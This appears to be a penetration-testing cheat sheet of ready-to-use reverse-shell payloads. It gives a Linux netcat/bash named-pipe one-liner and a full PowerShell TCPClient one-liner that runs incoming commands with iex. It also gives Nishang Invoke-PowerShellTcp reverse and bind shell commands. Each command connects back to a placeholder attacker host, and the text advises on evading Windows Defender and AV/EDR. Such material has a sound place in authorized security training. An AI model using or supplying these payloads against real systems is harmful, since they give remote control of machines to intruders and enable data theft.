## Linux Reverse Shell (Netcat/Bash)

Targeting a Linux environment where an interactive shell must be served over a network socket utilizing a named pipe.

Execute this sequence to create a named pipe and link standard output/error to a remote listener.

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ATTACK_IP> <PORT> > /tmp/f
```

- `rm -f /tmp/f` ensures no existing file blocks pipe creation.
- `mkfifo /tmp/f` creates the **FIFO named pipe**.
- `/bin/bash -i` forces an **interactive shell**.
- `2>&1` redirects **standard error** to the same stream as **standard output**.

**Gotchas** **OS mismatch** will cause the payload to fail if the target is not running a compatible Linux distribution with Bash and Netcat available.

## Windows Reverse Shell (PowerShell One-Liner)

Remote code execution via `cmd.exe` on a Windows target requiring a PowerShell-based callback without using an external script file.

Run this one-liner to instantiate a **TCPClient** and bind the input/output streams to a remote socket.

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACK_IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

- `-nop` ensures the command executes with **no profile**.
- `-c` identifies the following string as a **command/script block**.
- `iex` (**Invoke-Expression**) executes the received data locally.

**Gotchas** **Windows Defender** frequently identifies and stops PowerShell one-liners as malicious code during execution.

## PowerShell Scripting (Nishang)

Target provides an environment where `.ps1` script execution is preferred over long one-liners or requires specific modes like Bind shells.

Standard Nishang function for establishing a reverse callback to an attack host.

```
Invoke-PowerShellTcp -Reverse -IPAddress <ATTACK_IP> -Port <PORT>
```

Alternative syntax for establishing a listener on the target machine for a bind shell connection.

```
Invoke-PowerShellTcp -Bind -Port <PORT>
```

**Tool comparison**

- PowerShell One-Liner -> Syntax: `powershell -nop -c "..."` -> Prefer when exploiting RCE directly through `cmd.exe`.
- Nishang Script -> Syntax: `Invoke-PowerShellTcp` -> Prefer when requiring **Bind shells** or **IPv6** support.

**Edge cases**

- **IPv6** connections: Use Nishang `Invoke-PowerShellTcp` if the attack host uses an IPv6 address.

> ⚠️ Gap: The source provides script examples but omits the necessary PowerShell Execution Policy bypass (e.g., `-ExecutionPolicy Bypass`) required to run `.ps1` files on most default Windows configurations.

**Gotchas** **AV/EDR interference** may require modifying the script code or changing deployment methods to bypass signature-based restrictions.